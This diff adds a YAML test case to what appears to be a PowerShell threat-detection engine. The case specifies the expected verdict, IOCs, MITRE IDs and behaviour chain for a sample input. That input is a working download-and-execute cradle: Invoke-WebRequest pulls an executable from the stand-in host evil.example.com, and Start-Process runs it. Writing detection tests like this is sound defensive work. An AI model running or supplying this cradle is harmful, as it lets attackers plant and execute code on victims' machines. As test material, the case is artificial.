@@ -1,0 +1,53 @@
+id: T13_iwr_outfile_startprocess
+title: Malicious — Invoke-WebRequest + Start-Process download-and-execute cradle
+provenance: analyst-submitted sample (2026-08-01) · classic PowerShell dropper
+input: 'Invoke-WebRequest http://evil.example.com/a.exe -OutFile a.exe; Start-Process a.exe'
+expected_verdict: malicious
+must_fire_intents:
+  - staging
+  - remote_execution
+must_not_fire:
+  - persistence
+  - credential_access
+forbidden_words_in_verdict:
+  - ransomware
+  - cobalt strike
+  - campaign
+  - APT
+  - family
+must_admit_unknown: false
+expected_confidence_band: high
+expected_iocs:
+  - {kind: url,    value: 'http://evil.example.com/a.exe'}
+  - {kind: domain, value: 'evil.example.com'}
+  - {kind: file,   value: 'a.exe'}
+expected_mitre:
+  - T1105
+  - T1204.002
+expected_behaviors:
+  - remote source
+  - staging
+  - downloads executable
+  - writes executable
+  - executes downloaded
+expected_evidence:
+  - invoke-webrequest
+  - chain:parameter
+expected_behavior_kinds:
+  - download
+  - write_file
+  - remote_execution
+  - execute
+expected_behavior_chain:
+  - download
+  - write_file
+  - execute
+min_recommendations: 2
+notes: >
+  Canonical download-and-execute cradle: Invoke-WebRequest writes the
+  binary to disk (`-OutFile a.exe`) and Start-Process invokes it. The
+  Verdict Engine must recognise the normalised Download → Write →
+  Execute chain and escalate to MALICIOUS. IOC extraction must
+  surface the destination filename as a File IOC and the URL host as
+  a Domain IOC. The downloaded binary itself was not analysed — the
+  report must explicitly say so.
